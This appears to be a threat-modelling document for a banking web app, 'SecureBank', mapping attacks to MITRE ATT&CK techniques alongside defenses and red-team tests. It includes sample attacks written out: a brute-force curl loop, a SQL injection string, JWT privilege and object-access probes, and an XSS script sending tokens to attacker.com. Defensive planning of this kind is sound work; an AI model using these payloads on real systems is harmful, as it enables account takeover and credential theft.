# SecureBank - MITRE ATT&CK Mapping
**Phase 1 - Threat Analysis**

---

## Executive Summary
This document maps potential attacks on SecureBank to MITRE ATT&CK framework techniques, showing how attackers might compromise the system and what we must defend against.

---

## Attack Surface Analysis

### Key Assets to Protect
1. **User Credentials** (usernames, passwords)
2. **Authentication Tokens** (JWT tokens)
3. **User Accounts** (account data, balances)
4. **Transactions** (fund transfers)
5. **Admin Functions** (privileged operations)

### Entry Points
1. **Login Endpoint** (`POST /login`)
2. **Registration Endpoint** (`POST /register`)
3. **Transfer Endpoint** (`POST /transfer`)
4. **Frontend Application** (JavaScript, DOM)
5. **Database** (PostgreSQL backend)

---

## MITRE ATT&CK Techniques Mapped to SecureBank

### T1110: Brute Force (Credential Access)
**Scenario**: Attacker tries 100+ password combinations against login endpoint

**Attack Method**:
```bash
for i in {1..100}; do
  curl -X POST http://localhost:8000/login \
    -d '{"username":"admin","password":"password'$i'"}'
done
```

**Current Defense**: ❌ NONE
- No rate limiting on /login endpoint
- No account lockout mechanism
- No CAPTCHA

**Required Defense**:
- Redis-based rate limiting: Max 5 attempts per 5 minutes
- Account lockout after 5 failed attempts
- Exponential backoff

**Severity**: 🔴 CRITICAL

---

### T1190: Exploit Public-Facing Application (Initial Access)
**Scenario**: SQL Injection attack on login endpoint

**Attack Method**:
```
Username: admin' OR 1=1--
Password: anything
```

**How It Works**:
```python
# Vulnerable code (if using raw SQL)
query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
# Becomes: SELECT * FROM users WHERE username = 'admin' OR 1=1--' AND password = ...
# This returns first user (admin) without checking password!
```

**Current Defense**: ✅ GOOD
- Using FastAPI with SQLAlchemy ORM (parameterized queries)
- Input validation on email/username format

**Remaining Risk**: Medium
- Must verify NO raw SQL anywhere
- Need SAST scan with SonarQube

**Severity**: 🔴 CRITICAL (if vulnerable)

---

### T1078: Valid Accounts (Privilege Escalation)
**Scenario**: Attacker uses customer JWT to access admin endpoints

**Attack Method**:
```bash
# Customer has valid token from login
CUSTOMER_JWT="eyJhbGc..."

# Try to call admin endpoint
curl -H "Authorization: Bearer $CUSTOMER_JWT" \
  http://localhost:8000/admin
```

**Current Defense**: ✅ PARTIAL
- JWT has role field
- /admin endpoint checks role

**Remaining Risk**: If JWT validation is weak or role can be modified
- Need to verify: JWT signature verification (RS256)
- OPA policies enforcement
- Role immutability

**Severity**: 🟠 HIGH

---

### T1059.007: JavaScript/XSS (Execution)
**Scenario**: Attacker injects JavaScript in transfer note field

**Attack Method**:
```
Transfer Note: <script>
  fetch('http://attacker.com?token=' + localStorage.getItem('token'))
</script>
```

**Impact**: Steal JWT token from localStorage

**Current Defense**: ⚠️ WEAK
- Frontend has React (XSS protection built-in)
- ❌ NO DOMPurify
- ❌ NO Content-Security-Policy header
- ❌ Token stored in localStorage (XSS vulnerable)

**Required Defense**:
- DOMPurify library
- CSP header: `Content-Security-Policy: default-src 'self'`
- Move JWT to httpOnly cookie (not localStorage)

**Severity**: 🔴 CRITICAL

---

### T1212: Broken Object Level Authorization (Lateral Movement)
**Scenario**: Attacker changes account_id to access another user's data

**Attack Method**:
```bash
# User 1 logs in, gets JWT with sub="user_1"
JWT="eyJzdWI6InVzZXJfMSI..."

# Attacker tries to access user 2's account
curl -H "Authorization: Bearer $JWT" \
  http://localhost:8000/account/2

# If server doesn't validate that JWT.sub must equal account_id:
# Returns user 2's data (VULNERABLE!)
```

**Current Defense**: ⚠️ UNKNOWN
- Need to verify: Auth Service validates JWT.sub == requested_account_id
- Need to verify: Each endpoint checks authorization

**Required Defense**:
- Account Service middleware validates JWT subject
- Return 403 if JWT.sub != requested_account_id

**Severity**: 🟠 HIGH

---

### T1648: Serverless Execution (Future Risk)
**Scenario**: If Notification Service deployed as Lambda, attackers could abuse it

**Current Status**: ✅ NOT APPLICABLE
- Using Docker containers, not serverless

---

## Attack Chain: Complete Account Takeover

```
1. RECONNAISSANCE (T1589)
   └─> Attacker finds valid username via error messages
       "admin account already exists" reveals valid username

2. INITIAL ACCESS (T1110 - Brute Force)
   └─> 100+ login attempts
       Rate limiter not implemented → Success after 50 attempts

3. CREDENTIAL ACCESS (T1110)
   └─> Attacker has valid credentials
       Account compromised

4. DEFENSE EVASION (T1550 - Token Reuse)
   └─> Use stolen JWT from multiple IPs
       No IP pinning → Works

5. PRIVILEGE ESCALATION (T1078)
   └─> If customer, try to modify JWT to admin role
       If JWT signature not verified → Becomes admin

6. IMPACT
   └─> Transfer all funds to attacker's account
       Complete account takeover
```

---

## Attack Chain: Data Breach via SQLi

```
1. RECONNAISSANCE (T1589)
   └─> Map API endpoints

2. INITIAL ACCESS (T1190 - SQLi)
   └─> SQL Injection in /login
       If raw SQL used → Bypass authentication

3. EXECUTION (T1059)
   └─> Query entire users table

4. COLLECTION (T1005)
   └─> Read all user records

5. EXFILTRATION (T1020)
   └─> Send to attacker server
       Data breach: Millions of customer records exposed

6. IMPACT
   └─> Regulatory fines, customer lawsuits
```

---

## MITRE Tactics Coverage in SecureBank

| Tactic | Risk Level | Primary Techniques | Status |
|--------|------------|-------------------|--------|
| Reconnaissance | Medium | T1589 | Not directly preventable, monitor for patterns |
| Initial Access | Critical | T1190 (SQLi) | ✅ Protected via ORM, need verification |
| Execution | Critical | T1059 (XSS) | ❌ Vulnerable, needs DOMPurify + CSP |
| Persistence | High | T1133 | ⚠️ No logout/revocation |
| Privilege Escalation | High | T1078 | ⚠️ Needs verification |
| Defense Evasion | High | T1550 (Token Reuse) | ❌ No token validation |
| Credential Access | Critical | T1110 (Brute Force) | ❌ No rate limiting |
| Discovery | Medium | T1087 | Mitigated by error handling |
| Lateral Movement | High | T1570, T1021 | ✅ K8s NetworkPolicies |
| Collection | Medium | T1056 | ✅ Input validation |
| Exfiltration | Medium | T1020 | ⚠️ Monitoring needed |
| Impact | High | T1531, T1561 | ✅ Backups planned |

---

## Top 5 Critical Attacks to Test (Red Team)

### 1. T1110 - Brute Force on /login
- **Test**: Send 10 rapid login requests
- **Expected Result**: 429 Too Many Requests after 5 attempts
- **Actual Result**: ? (Need to test)

### 2. T1190 - SQL Injection
- **Test**: `POST /login` with username: `admin' OR 1=1--`
- **Expected Result**: 400 Bad Request (validation fails)
- **Actual Result**: ? (Need to test)

### 3. T1078 - Privilege Escalation
- **Test**: Use customer JWT to call `/admin` endpoint
- **Expected Result**: 403 Forbidden
- **Actual Result**: ? (Need to test)

### 4. T1059 - XSS in Transfer Note
- **Test**: Note: `<script>alert('XSS')</script>`
- **Expected Result**: Blocked by DOMPurify + CSP
- **Actual Result**: ? (Need to test)

### 5. T1212 - Broken Object Auth
- **Test**: Modify account_id in request
- **Expected Result**: 403 Forbidden
- **Actual Result**: ? (Need to test)

---

**Status**: Phase 1 Complete
**Next Step**: Create DREAD/PASTA Risk Matrix
**Pentesting Date**: Phase 3 (Days 5-10)
